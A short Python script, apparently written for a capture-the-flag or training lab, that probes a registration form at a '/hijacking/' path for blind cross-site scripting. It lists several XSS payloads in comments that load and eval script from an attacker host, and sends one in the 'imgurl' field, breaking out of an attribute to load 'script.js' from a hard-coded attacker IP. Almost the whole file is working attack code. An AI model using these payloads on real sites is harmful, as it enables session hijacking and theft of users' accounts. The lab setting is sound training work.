import requests

url = "http://10.129.160.134/hijacking/"

# Fields
# ======
# ?fullname=fullname&username=username&password=password&email=test%40test.com&imgurl=profile_url

# Payloads to test
# ================
# <script src=http://OUR_IP></script>
# '><script src=http://OUR_IP></script>
# "><script src=http://OUR_IP></script>
# javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
# <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
# <script>$.getScript("http://OUR_IP")</script>

IP = "10.10.14.114"
# IP = "test.thihanaung2.repl.co"
params = {
	"fullname": "Testing",
	"username": "Test",
	"password": "password",
	"email": "test@test.com",
	"imgurl": f"\"><script src=http://{IP}/script.js></script>",
}

r = requests.get(url, params=params)
print(r.text)